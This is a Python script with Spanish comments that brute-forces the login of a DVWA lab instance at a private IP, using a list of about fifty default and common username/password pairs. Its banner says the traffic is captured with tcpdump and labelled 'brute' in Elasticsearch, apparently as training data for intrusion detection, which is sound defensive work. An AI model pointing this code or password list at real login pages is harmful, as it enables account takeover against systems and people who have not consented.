import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS BRUTE FORCE ENTRENAMIENTO
# =============================================

PAYLOADS_BRUTE = [
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password123"),
    ("admin", "admin123"),
    ("admin", "root"),
    ("admin", "toor"),
    ("admin", "pass"),
    ("admin", "test"),
    ("admin", "qwerty"),
    ("admin", "abc123"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "monkey"),
    ("admin", "dragon"),
    ("admin", "master"),
    ("admin", "superman"),
    ("admin", "batman"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "123456"),
    ("root", "admin"),
    ("user", "user"),
    ("user", "password"),
    ("user", "1234"),
    ("test", "test"),
    ("test", "password"),
    ("guest", "guest"),
    ("guest", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin", "pass123"),
    ("admin", "Password1"),
    ("admin", "P@ssw0rd"),
    ("admin", "Admin1234"),
    ("admin", "secret"),
    ("admin", "changeme"),
    ("admin", "default"),
    ("admin", "admin1"),
    ("admin", "dvwa"),
    ("admin", "gordonb"),
    ("admin", "abc"),
    ("admin", "xyz"),
    ("admin", "2024"),
    ("admin", "2023"),
    ("admin", "qwerty123"),
    ("admin", "iloveyou"),
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_brute(session):
    print("\n[*] Iniciando ataques Brute Force...")
    payloads = PAYLOADS_BRUTE.copy()
    random.shuffle(payloads)
    ok = 0
    for usuario, contrasena in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                            params={"username": usuario, "password": contrasena, "Login": "Login"})
            resultado = "EXITO" if "Welcome" in r.text else "fallo"
            print(f"  BRUTE | {usuario}:{contrasena:<20} | {resultado} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Brute Force completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: BRUTE FORCE")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'brute'")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_brute(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'brute'")
    print("="*60)
